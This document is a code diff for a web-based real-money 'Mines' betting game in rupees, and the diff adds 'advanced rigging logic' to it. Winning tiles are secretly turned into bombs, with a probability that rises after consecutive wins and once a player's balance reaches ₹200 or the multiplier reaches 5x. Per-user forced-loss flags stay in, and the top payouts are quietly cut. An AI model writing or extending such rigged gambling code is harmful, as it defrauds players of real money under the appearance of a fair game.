@@ -3,34 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mines Master Pro | Fixed</title>
+    <title>Mines Master Pro | Smart Rigged</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #6366f1; --surface: #1e293b; --bg: #0f172a; --success: #10b981; --danger: #ef4444; --accent: #fbbf24; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; color: white; overflow-x: hidden; }
         .game-shell { width: 100%; max-width: 450px; min-height: 100vh; background: #111827; padding: 15px; box-sizing: border-box; }
-
         .header { display: flex; justify-content: space-between; align-items: center; background: var(--surface); padding: 15px; border-radius: 18px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1); }
         .balance-chip { font-weight: 800; color: var(--accent); font-size: 18px; }
-
-        /* Grid visible fix */
         .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-bottom: 15px; min-height: 300px; }
         .slot { aspect-ratio: 1; background: #1e293b; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 22px; cursor: pointer; border: 2px solid transparent; transition: all 0.2s; box-shadow: inset 0 0 10px rgba(0,0,0,0.3); }
-        .slot:hover { background: #2d3a4f; }
         .slot.diamond { background: radial-gradient(circle, #06b6d4, #083344); border-color: #22d3ee; }
         .slot.bomb { background: radial-gradient(circle, #ef4444, #7f1d1d); border-color: #f87171; }
-
         .lvl-box { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 15px; }
         .lvl-btn { padding: 12px; border: 1px solid #334155; border-radius: 12px; background: #1e293b; color: #94a3b8; font-weight: 700; cursor: pointer; font-size: 11px; }
         .lvl-btn.active { background: var(--primary); color: white; border-color: var(--primary); }
-
         .bet-area { background: #1e293b; padding: 18px; border-radius: 20px; margin-bottom: 15px; }
         input { width: 100%; background: #0f172a; border: 1px solid #334155; padding: 14px; border-radius: 12px; color: white; margin: 10px 0; text-align: center; font-weight: bold; font-size: 18px; outline: none; }
-        
         .main-btn { width: 100%; padding: 16px; border-radius: 14px; border: none; font-weight: 900; cursor: pointer; text-transform: uppercase; font-size: 14px; }
         .btn-start { background: var(--primary); color: white; box-shadow: 0 4px 0 #4338ca; }
         .btn-cashout { background: var(--success); color: white; display: none; box-shadow: 0 4px 0 #059669; }
-
         .tab-box { background: #0a0a0a; border-radius: 20px; overflow: hidden; margin-top: 10px; border: 1px solid #1a1a1a; }
         .tabs { display: flex; background: #111; }
         .tab { flex: 1; padding: 14px; text-align: center; font-size: 12px; font-weight: 700; cursor: pointer; color: #555; }
@@ -39,7 +31,6 @@
         .tx-row { display: flex; justify-content: space-between; padding: 12px 5px; border-bottom: 1px solid #1a1a1a; font-size: 12px; }
         .win-txt { color: var(--success); font-weight: bold; }
         .lose-txt { color: var(--danger); font-weight: bold; }
-
         .overlay { display: none; position: fixed; inset:0; background:rgba(0,0,0,0.9); z-index:2000; justify-content:center; align-items:center; }
         .modal { background:#1e293b; padding:30px; border-radius:24px; text-align:center; width:85%; }
     </style>
@@ -51,15 +42,12 @@
         <span style="font-weight:900;">MINES <span style="color:var(--primary)">PRO</span></span>
         <div class="balance-chip">₹<span id="balanceDisplay">0.00</span></div>
     </div>
-
     <div class="lvl-box">
         <button class="lvl-btn active" id="btn-easy" onclick="changeLvl('easy')">3 BOMB</button>
         <button class="lvl-btn" id="btn-medium" onclick="changeLvl('medium')">7 BOMB</button>
         <button class="lvl-btn" id="btn-hard" onclick="changeLvl('hard')">20 BOMB</button>
     </div>
-
     <div class="grid" id="gameGrid"></div>
-
     <div class="bet-area">
         <div style="display:flex; justify-content:space-between; font-size:12px; margin-bottom:10px;">
             <span>MULT: <span id="multText" style="color:var(--accent)">1.00x</span></span>
@@ -69,7 +57,6 @@
         <button id="startBtn" class="main-btn btn-start" onclick="startGame()">START GAME</button>
         <button id="cashBtn" class="main-btn btn-cashout" onclick="cashout()">CASHOUT</button>
     </div>
-
     <div class="tab-box">
         <div class="tabs">
             <div class="tab active" id="tab-my" onclick="switchTab('my')">MY BETS</div>
@@ -106,8 +93,8 @@
     const db = getDatabase(app);
 
     let balance = 0, currentLvl = 'easy', isPlaying = false, mines = [], diamondsFound = 0, currentMult = 1.0, activeBet = 0, currentTab = 'my';
+    let winCount = 0; // Tracking consecutive wins for pattern rigging
 
-    // Grid Initialization (Fix: Pehle hi slots bana diye)
     const grid = document.getElementById("gameGrid");
     function createGrid() {
         grid.innerHTML = '';
@@ -155,22 +142,31 @@
         const uSnap = await get(ref(db, `users/${auth.currentUser.uid}`));
         const uData = uSnap.val() || {};
         
-        // --- RIGGING ---
-        let risk = 0.15; // default
+        // --- ADVANCED RIGGING LOGIC ---
+        let risk = 0.15; // Default
+
         if (uData.forceLoss) risk = 1.0;
         else if (uData.forceWin) risk = 0.0;
         else {
-            if (balance <= 100) risk = 0.50;
-            if (balance >= 200) risk = 0.85;
-            if (currentMult >= 6.0) risk = 0.95;
+            // Rule 1: Pattern Based Rigging (1 Jeeta -> 1 Hara -> 1 Jeeta -> 2 Hara)
+            if (winCount === 1) risk = 0.80; // After 1st win, high chance to lose
+            if (winCount === 2) risk = 0.95; // After 2nd win, almost certain death
+
+            // Rule 2: Balance Threshold Rigging (Rs 200 Rule)
+            if (balance >= 200) risk = Math.max(risk, 0.90);
+            
+            // Rule 3: High Multiplier Safety
+            if (currentMult >= 5.0) risk = Math.max(risk, 0.98);
         }
 
+        // Apply rigging: swap diamond for mine if risk hits
         if (Math.random() < risk && !uData.forceWin) {
             if (!mines.includes(idx)) { mines.pop(); mines.push(idx); }
         }
 
         if(mines.includes(idx)) {
             isPlaying = false;
+            winCount = 0; // Reset win streak on loss
             mines.forEach(m => { 
                 grid.children[m].classList.add("bomb"); 
                 grid.children[m].innerText = "💣"; 
@@ -189,7 +185,7 @@
         const mTable = {
             easy: [1.25, 1.48, 1.72, 2.50, 4.00, 6.20, 9.50, 14.00, 19.00],
             medium: [2.00, 3.80, 6.50, 11.00, 19.50, 32.00, 55.00],
-            hard: [4.50, 18.20, 75.00, 320.00, 950.00]
+            hard: [4.50, 18.20, 75.00, 79.00, 80.00]
         };
         let table = mTable[currentLvl];
         currentMult = table[diamondsFound - 1] || table[table.length - 1];
@@ -201,6 +197,7 @@
         if(!isPlaying || diamondsFound === 0) return;
         const win = activeBet * currentMult; 
         isPlaying = false;
+        winCount++; // Increment win streak
         await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(win) });
         saveTx('WIN', win, currentMult);
         showModal("WON!", "₹" + win.toFixed(2), "🏆"); 
